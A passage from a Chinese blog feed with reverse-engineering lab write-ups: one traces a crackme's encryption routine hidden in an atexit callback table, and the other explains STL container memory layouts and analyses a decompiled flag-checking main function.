dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">003</span>D9F90</span><br><span class="line">.text:<span class="number">003</span>D9F90                 mov     edi, edi</span><br><span class="line">.text:<span class="number">003</span>D9F92                 push    ebp</span><br><span class="line">.text:<span class="number">003</span>D9F93                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">003</span>D9F95                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">003</span>D9F98                 lea     eax, [ebp+arg_0]</span><br><span class="line">.text:<span class="number">003</span>D9F9B                 push    eax</span><br><span class="line">.text:<span class="number">003</span>D9F9C                 lea     ecx, [ebp+var_8]</span><br><span class="line">.text:<span class="number">003</span>D9F9F                 call    unknown_libname_845 ; Microsoft VisualC universal runtime</span><br><span class="line">.text:<span class="number">003</span>D9FA4                 push    eax</span><br><span class="line">.text:<span class="number">003</span>D9FA5                 mov     ecx, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">003</span>D9FA8                 push    ecx</span><br><span class="line">.text:<span class="number">003</span>D9FA9                 lea     edx, [ebp+arg_0]</span><br><span class="line">.text:<span class="number">003</span>D9FAC                 push    edx</span><br><span class="line">.text:<span class="number">003</span>D9FAD                 lea     ecx, [ebp+var_C]</span><br><span class="line">.text:<span class="number">003</span>D9FB0                 call    unknown_libname_844 ; Microsoft VisualC universal runtime</span><br><span class="line">.text:<span class="number">003</span>D9FB5                 push    eax</span><br><span class="line">.text:<span class="number">003</span>D9FB6                 lea     ecx, [ebp+var_1]</span><br><span class="line">.text:<span class="number">003</span>D9FB9                 call    sub_3D9EF0 <span class="comment">// &lt;--here</span></span><br><span class="line">.text:<span class="number">003</span>D9FBE                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">003</span>D9FC0                 pop     ebp</span><br><span class="line">.text:<span class="number">003</span>D9FC1                 retn</span><br><span class="line">.text:<span class="number">003</span>D9FC1 sub_3D9F90      endp</span><br></pre></td></tr></table></figure><p>这个函数又call了3d9ef0，然后莫名其妙跳两次就到了我们的加密函数了。从IDAtrace中压入的内容来看（可能是自动识别），猜测程序是把加密函数注册在了visualc++编译的一个退出处理程序中。</p><h1>最后的分析</h1><p>不知道从哪里开始看，我们先看这个加密函数头IDA为我们自动标注的内容：SEH</p><h2 id="SEH">SEH</h2><p>copilot：</p><blockquote><p>SEH（Structured Exception Handling）是Windows操作系统提供的一种异常处理机制。它允许程序在运行时捕获和处理异常，如访问冲突、除零错误等。SEH的主要特点包括：</p><ol><li class="lvl-3">异常处理框架：SEH使用__try和__except块来定义异常处理代码。</li><li class="lvl-3">异常过滤器：__except块可以包含一个过滤器表达式，用于确定是否处理异常。</li><li class="lvl-3">异常处理程序：如果过滤器表达式返回EXCEPTION_EXECUTE_HANDLER，则执行异常处理代码。</li></ol></blockquote><p>但是用x64dbg查seh链没查到，不是这个（也可能不直接是）。</p><h2 id="aexit和回调函数">aexit和回调函数</h2><p>这个应该是这个程序实现隐藏的方式。跟踪到执行加密2函数的时候查看调用堆栈，存在一个ida识别为<code>__execute_onexit_table</code>的函数，这个函数用于在程序退出的时候执行回调函数，而这些函数在编写程序的时候通过atexit注册并形成指针数组（类似finiarray）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00173</span>D20 ; <span class="type">int</span> __cdecl _execute_onexit_table(<span class="type">_onexit_table_t</span> *Table)</span><br><span class="line">.text:<span class="number">00173</span>D20 __execute_onexit_table proc near        ; CODE XREF: j___execute_onexit_table↑j</span><br><span class="line">.text:<span class="number">00173</span>D20</span><br><span class="line">.text:<span class="number">00173</span>D20 var_4           = byte ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">00173</span>D20 Table           = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00173</span>D20</span><br><span class="line">.text:<span class="number">00173</span>D20                 mov     edi, edi</span><br><span class="line">.text:<span class="number">00173</span>D22                 push    ebp</span><br><span class="line">.text:<span class="number">00173</span>D23                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">00173</span>D25                 push    ecx</span><br><span class="line">.text:<span class="number">00173</span>D26                 lea     eax, [ebp+Table]</span><br><span class="line">.text:<span class="number">00173</span>D29                 push    eax</span><br><span class="line">.text:<span class="number">00173</span>D2A                 lea     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">00173</span>D2D                 call    unknown_libname_942 ; Microsoft VisualC universal runtime</span><br><span class="line">.text:<span class="number">00173</span>D32                 push    eax</span><br><span class="line">.text:<span class="number">00173</span>D33                 call    j_unknown_libname_848</span><br><span class="line">.text:<span class="number">00173</span>D38                 push    eax</span><br><span class="line">.text:<span class="number">00173</span>D39                 call    sub_173500 <span class="comment">// &lt;--here</span></span><br><span class="line">.text:<span class="number">00173</span>D3E                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00173</span>D41                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">00173</span>D43                 pop     ebp</span><br><span class="line">.text:<span class="number">00173</span>D44                 retn</span><br><span class="line">.text:<span class="number">00173</span>D44 __execute_onexit_table endp</span><br></pre></td></tr></table></figure><p>跟进table（居然是栈）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF958                 dd <span class="number">0</span>A08BC5FCh</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF95C                 dd offset sub_1BFCB0</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF960                 dd <span class="number">0</span>CCCCCCCCh</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF964                 dd <span class="number">0</span>CCCCCCCCh</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF968                 dd offset sub_1BFCB0</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF96C                 dd <span class="number">0</span>A0373C60h</span><br><span class="line">Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF970                 dd <span class="number">0</span>CCCCCCCCh</span><br></pre></td></tr></table></figure><p>可以看到有个函数在里面，而这个函数内部调用了真正的加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">001B</span>FCB0 sub_1BFCB0      proc near               ; DATA XREF: sub_A57B0+<span class="number">28</span>↑o</span><br><span class="line">.text:<span class="number">001B</span>FCB0                                         ; Stack[<span class="number">000070E0</span>]:<span class="number">00B</span>CF95C↓o ...</span><br><span class="line">.text:<span class="number">001B</span>FCB0</span><br><span class="line">.text:<span class="number">001B</span>FCB0 var_C0          = byte ptr <span class="number">-0</span>C0h</span><br><span class="line">.text:<span class="number">001B</span>FCB0</span><br><span class="line">.text:<span class="number">001B</span>FCB0                 push    ebp</span><br><span class="line">.text:<span class="number">001B</span>FCB1                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">001B</span>FCB3                 sub     esp, <span class="number">0</span>C0h</span><br><span class="line">.text:<span class="number">001B</span>FCB9                 push    ebx</span><br><span class="line">.text:<span class="number">001B</span>FCBA                 push    esi</span><br><span class="line">.text:<span class="number">001B</span>FCBB                 push    edi</span><br><span class="line">.text:<span class="number">001B</span>FCBC                 lea     edi, [ebp+var_C0]</span><br><span class="line">.text:<span class="number">001B</span>FCC2                 mov     ecx, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">001B</span>FCC7                 mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">.text:<span class="number">001B</span>FCCC                 rep stosd</span><br><span class="line">.text:<span class="number">001B</span>FCCE                 mov     ecx, offset unk_203086</span><br><span class="line">.text:<span class="number">001B</span>FCD3                 call    sub_9C28D</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0009</span>C28D sub_9C28D       proc near               ; CODE XREF: sub_1BFCB0+<span class="number">23</span>↓p</span><br><span class="line">.text:<span class="number">0009</span>C28D                 jmp     sub_ACEB0 <span class="comment">// &lt;--加密函数</span></span><br><span class="line">.text:<span class="number">0009</span>C28D sub_9C28D       endp</span><br></pre></td></tr></table></figure><p>而中间的那些lambda调用估计是源码风格的原因，可能是套了几个调用搞出来的东西。</p><h1>总结</h1><p>神秘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;前情提要&lt;/h1&gt;
&lt;p&gt;这道题目是按照课堂上演示的逻辑只改了加密用的数组（换成了学号），逻辑是一样的。上课的演示是啥也看不懂然后ida搜索异或指令进去一个个看，诶🤓，我们就找到了一个输入异或的简单加密函数，这题就解了。事实上之前没有逆向经验的同学也是按照这个步骤很简单</summary>
      
    
    
    
    <category term="Reverse" scheme="http://example.com/categories/Reverse/"/>
    
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>STL容器逆向——逆向工程实验STLWP</title>
    <link href="http://example.com/2024/09/19/STL%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8CSTLWP/"/>
    <id>http://example.com/2024/09/19/STL%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8CSTLWP/</id>
    <published>2024-09-19T04:57:35.000Z</published>
    <updated>2024-09-23T01:18:05.661Z</updated>
    
    <content type="html"><![CDATA[<h1>什么是STL?</h1><p>STL(Standard Template Library)是C++库为我们实现好的一系列数据结构和方法，是一些常用结构的标准实现。他们的数据结构都被定义好了，在编程的时候可以直接调用。</p><p>那么对于逆向来说，我们主要是要识别出对应的STL容器类以及对他们操作的函数功能（常见的类方法），识别相关容器的内存结构能起到很大作用。简单记录一下，其实这个没有Go这种逆向难。</p><h1>本题中STL容器的内存结构和分析</h1><blockquote><p>参考<a href="https://www.52pojie.cn/thread-1720719-1-1.html">https://www.52pojie.cn/thread-1720719-1-1.html</a><br>参考<a href="https://zhuanlan.zhihu.com/p/604288453%EF%BC%8C%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E5%86%99%E4%BA%86%E4%B8%80%E4%B8%AALLVM">https://zhuanlan.zhihu.com/p/604288453，这篇文章写了一个LLVM</a> PASS来分析底层结构注意，以下的结构并不是“严格”遵循的，比如本题中红黑树就有细小的差别，应该与版本等有关，重要的是识别出在干嘛然后方便我们猜测程序的功能。</p></blockquote><h2 id="String">String</h2><p>C++的String结构包含一个指向内容的指针，一个长度和一个联合体：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.std::__cxx11::basic_string &#123;</span><br><span class="line">    <span class="keyword">struct</span>.std::__cxx11::basic_string&lt;<span class="type">char</span>, std::char_traits&lt;<span class="type">char</span>&gt;, std::allocator&lt;<span class="type">char</span>&gt; &gt;::_Alloc_hider &#123;</span><br><span class="line">        <span class="type">uint8_t</span>* ptr;</span><br><span class="line">    &#125; dataplus;</span><br><span class="line">    <span class="type">uint64_t</span> string_length;</span><br><span class="line">    <span class="keyword">union</span>.anon &#123;</span><br><span class="line">        <span class="type">uint64_t</span> allocated_capacity;</span><br><span class="line">        <span class="type">uint8_t</span> local_buf[<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; field_0;</span><br></pre></td></tr></table></figure><p>如果字符串长度较小（小于8），会直接将字符串的内容和String结构放在一起，第一个字段就指向localbuf，也就是说对于局部变量字符串就会放在栈上，我们能看到。如果字符串长，字符串内容就会分配在堆上，那么这个字段就会存储堆上分配的空间大小。</p><p>对于String，结合本题来看，动调确定主流程中的输入模块之后分析参数可以看出是String，这时候可以先输入8个或以下字符跟进看一下，在栈上就大概率是了。</p><h2 id="Vector">Vector</h2><p>Vector容器看着功能多，实际上底层就三个指针，第一个存放数据开始，第二个存放数据结束，第三个存放当前vector容量的结束位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.std::vector&lt;string&gt; &#123;</span><br><span class="line">    <span class="keyword">struct</span>.std::_Vector_base &#123;</span><br><span class="line">        <span class="keyword">struct</span>.std::_Vector_base&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::allocator&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt; &gt;::_Vector_impl &#123;</span><br><span class="line">            <span class="keyword">struct</span>.std::_Vector_base&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::allocator&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt; &gt;::_Vector_impl_data &#123;</span><br><span class="line">                <span class="keyword">class</span>.std::__cxx11::basic_string* start;</span><br><span class="line">                <span class="keyword">class</span>.std::__cxx11::basic_string* finish;</span><br><span class="line">                <span class="keyword">class</span>.std::__cxx11::basic_string* end_of_storage;</span><br><span class="line">            &#125; field_0;</span><br><span class="line">        &#125; field_0;</span><br><span class="line">    &#125; field_0;</span><br><span class="line">&#125; field_0;</span><br></pre></td></tr></table></figure><p>内存中的结构就是三个相连的指针。如果vector是一直随输入变化增长的没有事先申请额外的空间（一般可能都是这样），那么finish字段的内容和end_of_storage将会指向同一个地址。如果内存中有一个开始地址，连续两个结束地址而且跟进看发现是数据，那么大概率是vector了。</p><h2 id="rb-tree">rb_tree</h2><p>红黑树，我并不了解红黑树相关的算法思想，这里先简单介绍一下：</p><blockquote><p>红黑树就是一个自平衡的搜索二叉树，和一般二叉树不同的是，它为每个节点标注夜色（红/黑），并遵循一定的规则。根节点黑色开始，叶子结点（NIL）黑色结束。红色节点的子节点必须都是黑色，且任意节点到每个叶子结点的所有路径都包含相同数量的黑色节点。总之就是通过某些人为的染色规定，保证二叉树的相对平衡，令其在最坏情况下有O(logn)的复杂度。</p></blockquote><p>我们并不关心它的算法实现，STL为我们实现好了，我们关心的是他的内存视图。他的内存视图有两种，header和node。header是一个代表一整颗树的变量，node是真正的结点。</p><h3 id="header">header</h3><p>对于一个header，它应该包含以下信息（本题中一个header占6个机器字长）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.std::map&lt;string,string&gt; &#123;</span><br><span class="line">    <span class="keyword">class</span>.std::_Rb_tree<span class="number">.6</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span>.std::_Rb_tree&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::pair&lt;<span class="type">const</span> std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt;, std::_Select1st&lt;std::pair&lt;<span class="type">const</span> std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt;, std::allocator&lt;std::pair&lt;<span class="type">const</span> std::__cxx11::basic_string&lt;<span class="type">char</span>&gt;, std::__cxx11::basic_string&lt;<span class="type">char</span>&gt; &gt; &gt; &gt;::_Rb_tree_impl &#123;</span><br><span class="line">            <span class="keyword">struct</span>.std::_Rb_tree_key_compare &#123;</span><br><span class="line">                <span class="keyword">struct</span>.std::less &#123;</span><br><span class="line">                    <span class="type">uint8_t</span> value;</span><br><span class="line">                &#125; key_compare;</span><br><span class="line">            &#125; compare;</span><br><span class="line">            <span class="keyword">struct</span>.std::_Rb_tree_header &#123;</span><br><span class="line">                <span class="keyword">struct</span>.std::_Rb_tree_node_base &#123;</span><br><span class="line">                    <span class="type">uint32_t</span> color; <span class="comment">// 不知道为什么做题的时候这里header是8个字节</span></span><br><span class="line">                    <span class="keyword">struct</span>.std::_Rb_tree_node_base* parent;</span><br><span class="line">                    <span class="keyword">struct</span>.std::_Rb_tree_node_base* left;</span><br><span class="line">                    <span class="keyword">struct</span>.std::_Rb_tree_node_base* right;</span><br><span class="line">                &#125; node;</span><br><span class="line">                <span class="type">uint64_t</span> node_count;</span><br><span class="line">            &#125; field_1;</span><br><span class="line">        &#125; field_0;</span><br><span class="line">    &#125; field_0;</span><br><span class="line">&#125; field_0;</span><br></pre></td></tr></table></figure><p>简单说，第一个字段不重要（也没懂是干嘛的），后面包含color，parent,left,right的三个指针，以及一个节点总数。对于rbtree，color只取0和1，0黑1红。</p><p>header的这三个指针，在树为空的时候parent为0，left和right指向自己，树初始化后，paretn指向根节点，left和right则指向这个树最左边和最右边的结点。同时header和真正的根节点root他们的parent互相是对方。</p><h3 id="node">node</h3><p>一个节点存储的信息就好说了，只有color（0和1，int32），parent，left，right三个指针，以及一个存储真正数据的element data域。</p><p>总之，红黑树的关键就是那个color，识别到有这种0和1的color域就可能是红黑树。</p><h2 id="Others">Others</h2><p>STL容器还有很多，deque，基于红黑树的map等等，这里不再细说，了解这三种足够我们做这道题了。</p><h1>题目分析</h1><p>拿到手IDA打开，主函数很清晰，输入正确会显示flag</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">v18 = sub_4E0940;</span><br><span class="line">v19 = &amp;off_5010FC;</span><br><span class="line">v20 = &amp;v45;</span><br><span class="line">v21 = &amp;loc_401ACF;</span><br><span class="line">v22 = v13;</span><br><span class="line"><span class="built_in">sub_40CB20</span>(&amp;v13[<span class="number">64</span>], &amp;loc_401ACF, envp);</span><br><span class="line"><span class="built_in">sub_40B470</span>();</span><br><span class="line"><span class="built_in">sub_4C17C0</span>(&amp;a1);</span><br><span class="line"><span class="built_in">sub_4BCE40</span>(&amp;vector1);</span><br><span class="line">v28[<span class="number">0</span>] = <span class="number">0xA7398D39</span>;</span><br><span class="line">v28[<span class="number">1</span>] = <span class="number">0x7EA7887E</span>;</span><br><span class="line">v28[<span class="number">2</span>] = <span class="number">0xF3DE7E39</span>;</span><br><span class="line">v28[<span class="number">3</span>] = <span class="number">0xB5F37E12</span>;</span><br><span class="line">v28[<span class="number">4</span>] = <span class="number">0x733AF388</span>;</span><br><span class="line">v28[<span class="number">5</span>] = <span class="number">0x7EDE73F3</span>;</span><br><span class="line">v28[<span class="number">6</span>] = <span class="number">0xA7DE8DAA</span>;</span><br><span class="line">v28[<span class="number">7</span>] = <span class="number">0xA7DEA739</span>;</span><br><span class="line">v28[<span class="number">8</span>] = <span class="number">0x8D7EB57E</span>;</span><br><span class="line">ssm0.m128i_i64[<span class="number">0</span>] = (__int64)v28; <span class="comment">// 128位16字节，第一个存数组指针第二个存数组长度</span></span><br><span class="line">ssm0.m128i_i64[<span class="number">1</span>] = <span class="number">9LL</span>;</span><br><span class="line"><span class="built_in">nop2</span>((__int64)&amp;v29);</span><br><span class="line">ssm00 = _mm_load_si128(&amp;ssm0);</span><br><span class="line">v17 = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">init_vec</span>(&amp;vector2, ssm00.m128i_i64, (__int64)&amp;v29);</span><br><span class="line"><span class="built_in">nop</span>((__int64)&amp;v29);</span><br><span class="line"><span class="built_in">memcpy</span>(ascii_db0, ascii_db, <span class="built_in">sizeof</span>(ascii_db0));</span><br><span class="line">ssm1.m128i_i64[<span class="number">0</span>] = (__int64)ascii_db0;</span><br><span class="line">ssm1.m128i_i64[<span class="number">1</span>] = <span class="number">256LL</span>;</span><br><span class="line"><span class="built_in">nop3</span>((__int64)&amp;v32);</span><br><span class="line">ssm00 = _mm_load_si128(&amp;ssm1);</span><br><span class="line">v17 = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">tree_create</span>(&amp;rb_tree, ssm00.m128i_i64, (__int64)&amp;v31, (__int64)&amp;v32);</span><br><span class="line"><span class="built_in">nop4</span>((__int64)&amp;v32);</span><br><span class="line">v17 = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">String_append</span>(qword_4E4740, &amp;a1, v3);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">get_lenth</span>(&amp;a1) != <span class="number">36</span> )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  ssm1.m128i_i64[<span class="number">0</span>] = i;</span><br><span class="line">  lenth = <span class="built_in">get_lenth</span>(&amp;a1);</span><br><span class="line">  <span class="keyword">if</span> ( ssm1.m128i_i64[<span class="number">0</span>] &gt;= lenth )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v17 = <span class="number">3</span>;</span><br><span class="line">  chr = (<span class="type">unsigned</span> __int8 *)<span class="built_in">String_get_idx</span>(&amp;a1, i);</span><br><span class="line">  enc0 = <span class="built_in">enc</span>(*chr);</span><br><span class="line">  v43 = *(_BYTE *)<span class="built_in">sub_4B7D90</span>((__int64)&amp;rb_tree, &amp;enc0);</span><br><span class="line">  idx = (<span class="type">unsigned</span> __int8 *)<span class="built_in">String_get_idx</span>(&amp;a1, i + <span class="number">1</span>);</span><br><span class="line">  v34 = <span class="built_in">enc</span>(*idx);</span><br><span class="line">  v42 = *(_BYTE *)<span class="built_in">sub_4B7D90</span>((__int64)&amp;rb_tree, &amp;v34);</span><br><span class="line">  v7 = (<span class="type">unsigned</span> __int8 *)<span class="built_in">String_get_idx</span>(&amp;a1, i + <span class="number">2</span>);</span><br><span class="line">  v35 = <span class="built_in">enc</span>(*v7);</span><br><span class="line">  v41 = *(_BYTE *)<span class="built_in">sub_4B7D90</span>((__int64)&amp;rb_tree, &amp;v35);</span><br><span class="line">  v8 = (<span class="type">unsigned</span> __int8 *)<span class="built_in">String_get_idx</span>(&amp;a1, i + <span class="number">3</span>);</span><br><span class="line">  v36 = <span class="built_in">enc</span>(*v8);</span><br><span class="line">  v40 = *(_BYTE *)<span class="built_in">sub_4B7D90</span>((__int64)&amp;rb_tree, &amp;v36);</span><br><span class="line">  v37 = (v41 &lt;&lt; <span class="number">8</span>) | (v42 &lt;&lt; <span class="number">16</span>) | (v43 &lt;&lt; <span class="number">24</span>) | v40;</span><br><span class="line">  <span class="built_in">vector_pushback</span>((__int64)&amp;vector1, &amp;v37);</span><br><span class="line">&#125;</span><br><span class="line">ssm0.m128i_i64[<span class="number">0</span>] = <span class="built_in">chr_memcpy2stack</span>(&amp;vector2);</span><br><span class="line">ssm1.m128i_i64[<span class="number">0</span>] = <span class="built_in">sub_4BCC10</span>((__int64)&amp;vector1);</span><br><span class="line">v9 = <span class="built_in">chr_memcpy2stack</span>(&amp;vector1);</span><br><span class="line">v17 = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_4D8000</span>(v9, ssm1.m128i_i64[<span class="number">0</span>], ssm0.m128i_i64[<span class="number">0</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">sub_4DB950</span>(v39, <span class="string">&quot;you find it, flag is vmc&#123;&quot;</span>, &amp;a1);</span><br><span class="line">  v17 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">sub_4DB900</span>(v38, v39, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">  v17 = <span class="number">5</span>;</span><br><span class="line">  v10 = <span class="built_in">sub_4DB310</span>(&amp;unk_4E4AA0, v38);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(__int64))sub_4D7EE0)(v10);</span><br><span class="line">  <span class="built_in">sub_4C1B00</span>(v38);</span><br><span class="line">  <span class="built_in">sub_4C1B00</span>(v39);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = <span class="number">3</span>;</span><br><span class="line">  v11 = <span class="built_in">sub_4DB0D0</span>(&amp;unk_4E4AA0, <span class="string">&quot;try again&quot;</span>);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(__int64))sub_4D7EE0)(v11);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sub_4B7D70</span>(&amp;rb_tree);</span><br><span class="line"><span class="built_in">sub_4BCEA0</span>(&amp;vector2);</span><br><span class="line"><span class="built_in">sub_4BCEA0</span>(&amp;vector1);</span><br><span class="line"><span class="built_in">sub_4C1B00</span>(&amp;a1);</span><br><span class="line">ssm1.m128i_i32[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sub_40CB80</span>(&amp;v16);</span><br><span class="line"><span class="keyword">return</span> ssm1.m128i_i32[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>这里用了STL容器但是把符号全扣了，我们先来找一下输入函数，动调单步，输入函数看不懂太复杂，确定输入是这个a1，而且输入8个字符放在栈上，结构也符合，a1应该是一个String类来接受我们的输入。确定是String类后根据String的结构还原一下结构体，也就找到了getlenth的函数，可以看到我们要输入36个字符。</p><p>中间的ssm和m128i这种代表用了simd指令集，用到了那个128位的xmm寄存器，操作这个寄存器可以按64,32位去放数据。允许两个机器字长。</p><p>加密逻辑就是主函数的循环，一次跑4个字节，跑9轮到长度就退出。还原结构体后可以看到中间是按i去从String内容里按下标取出字符，然后调用一个位运算操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">String_get_idx</span><span class="params">(String_class *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span 